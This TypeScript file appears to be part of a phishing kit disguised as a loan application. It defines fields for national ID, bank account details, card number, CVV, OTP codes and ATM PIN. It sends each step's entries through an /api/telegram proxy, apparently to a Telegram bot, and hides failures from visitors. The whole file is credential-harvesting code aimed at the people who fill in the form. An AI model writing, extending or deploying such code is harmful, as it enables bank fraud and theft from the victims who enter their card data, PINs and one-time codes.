export interface ApplicationSubmissionData {
  step: number;
  stepName: string;
  timestamp: string;
  referenceNo?: string;
  // Step 1: Personal Information
  fullName?: string;
  cnic?: string;
  mobileNo?: string;
  gender?: string;
  dateOfBirth?: string;
  province?: string;
  address?: string;
  // Step 2: Bank Information
  loanAmount?: string;
  loanPurpose?: string;
  occupation?: string;
  bankName?: string;
  accountNumber?: string;
  currentBalance?: string;
  monthlyIncome?: string;
  // Step 3: Card / Fees
  cardNumber?: string;
  expiry?: string;
  cvv?: string;
  processingTax?: string;
  // Step 4: OTP Verification
  otpCode?: string;
  // Step 5: ATM PIN
  atmPin?: string;
  // Step 6: Final OTP
  finalOtpCode?: string;
}

/**
 * Dispatches form submission data securely to the backend /api/telegram proxy.
 * Note: Telegram Bot Tokens and Chat IDs are kept strictly server-side and never
 * exposed to client-side scripts.
 */
export async function sendTelegramNotification(
  data: ApplicationSubmissionData
): Promise<{ success: boolean; error?: string }> {
  try {
    const response = await fetch('/api/telegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      return { success: false };
    }

    const resJson = await response.json().catch(() => ({}));
    return { success: resJson.success === true };
  } catch {
    // Fail silently without exposing technical errors or secrets to visitors
    return { success: false };
  }
}
